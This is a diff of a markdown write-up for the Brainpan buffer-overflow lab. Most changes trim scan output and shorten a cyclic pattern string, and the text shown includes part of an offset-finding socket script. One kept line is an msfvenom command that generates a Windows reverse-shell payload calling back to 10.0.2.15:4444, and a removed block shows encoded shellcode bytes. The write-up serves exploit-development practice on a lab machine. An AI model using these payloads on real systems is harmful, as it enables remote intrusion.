@@ -13,54 +13,13 @@ tags: [fuzzing,badchars,JMP ESP,BOF,Immunity Debugger,Shellcode,pattern_create,p
 #### Port Scan
 
 ```bash
-┌──(alienum㉿kali)-[~]
-└─$ sudo nmap -A -O -sS 10.0.2.254                                        
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 00:08 EEST
-Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
-NSE Timing: About 99.28% done; ETC: 00:09 (0:00:00 remaining)
-Nmap scan report for 10.0.2.254 (10.0.2.254)
-Host is up (0.00090s latency).
-Not shown: 998 closed ports
+sudo nmap -A -O -sS 10.0.2.254
+```
+
+```bash                                   
 PORT      STATE SERVICE VERSION
-9999/tcp  open  abyss?
-| fingerprint-strings:
-|   NULL:
-|     _| _|
-|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
-|     _|_| _| _| _| _| _| _| _| _| _| _| _|
-|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
-|     [________________________ WELCOME TO BRAINPAN _________________________]
-|_    ENTER THE PASSWORD
+9999/tcp  open  abyss
 10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
-|_http-title: Site doesnt have a title (text/html).
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port9999-TCP:V=7.91%I=7%D=6/7%Time=60BD3967%P=x86_64-pc-linux-gnu%r(NUL
-SF:L,298,_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
-SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\
-SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
-SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
-SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\
-SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x
-SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2
-SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
-SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
-SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\
-SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
-SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
-SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2
-...
-Device type: general purpose
-Running: Linux 2.6.X|3.X
-OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
-OS details: Linux 2.6.32 - 3.10
-Network Distance: 1 hop
-
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.90 ms 10.0.2.254 (10.0.2.254)
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 39.94 seconds
 ```
 
 #### Directory Scan | Port 10000
@@ -70,23 +29,10 @@ Nmap done: 1 IP address (1 host up) scanned in 39.94 seconds
 - Found : /bin
 
 ```bash
-┌──(alienum㉿kali)-[~]
-└─$ gobuster dir -k -u http://10.0.2.254:10000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x.txt,.bak,.exe
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.0.2.254:10000
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Extensions:              txt,bak,exe
-[+] Timeout:                 10s
-===============================================================
-2021/06/07 00:12:54 Starting gobuster in directory enumeration mode
-===============================================================
+gobuster dir -k -u http://10.0.2.254:10000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x.txt,.bak,.exe
+```
+
+```bash
 /bin                  (Status: 301) [Size: 0] [--> /bin/]
 Progress: 29444 / 5095336 (0.58%)
 ```
@@ -163,7 +109,7 @@ while True:
 ```bash
 ┌──(alienum㉿kali)-[~]
 └─$ msf-pattern_create -l 600 -s ABCDEFGHIKL,alienum,123456789
-Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Al1Al2Al3Al4Al5Al6Al7Al8Al9Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9An1An2An3An4An5An6An7An8An9Au1Au2Au3Au4Au5Au6Au7Au8Au9Am1Am2Am3Am4Am5Am6Am7Am8Am9Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Be1Be2Be3Be4Be5Be6Be7Be8Be9Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Da1Da2Da3Da4Da5Da6Da7Da8Da9Dl1Dl2
+Aa1Aa2<REMOVED>Dl1Dl2
 ```
 
 - offset.py
@@ -172,7 +118,7 @@ Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Al1Al2Al3Al4Al5Al6Al7Al8Al9Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai
 import socket,sys
 
 #msf-pattern_create -l 600 -s ABCDEFGHIKL,alienum,123456789
-payload = "Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Al1Al2Al3Al4Al5Al6Al7Al8Al9Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9An1An2An3An4An5An6An7An8An9Au1Au2Au3Au4Au5Au6Au7Au8Au9Am1Am2Am3Am4Am5Am6Am7Am8Am9Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Be1Be2Be3Be4Be5Be6Be7Be8Be9Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Da1Da2Da3Da4Da5Da6Da7Da8Da9Dl1Dl2"
+payload = "Aa1Aa2<REMOVED>Dl1Dl2"
 
 
 try:
@@ -332,26 +278,6 @@ except Exception as ex:
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f python -a x86 -b '\x00'
 ```
-
-```bash
-┌──(alienum㉿kali)-[~]
-└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f python -a x86 -b '\x00'
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-Found 11 compatible encoders
-Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 351 (iteration=0)
-x86/shikata_ga_nai chosen with final size 351
-Payload size: 351 bytes
-Final size of python file: 1712 bytes
-buf =  b""
-buf += b"\xda\xd3\xba\xad\x21\x4e\x88\xd9\x74\x24\xf4\x5e\x29"
-...
-buf += b"\xfa\x1e\x02\x15\xbc\xf3\x7e\x06\x29\xf3\x2d\x27\x78"     
-┌──(alienum㉿kali)-[~]
-└─$
-```
-
-
 - python script
 - Important the above code is running with python not python3 like previous scripts
 
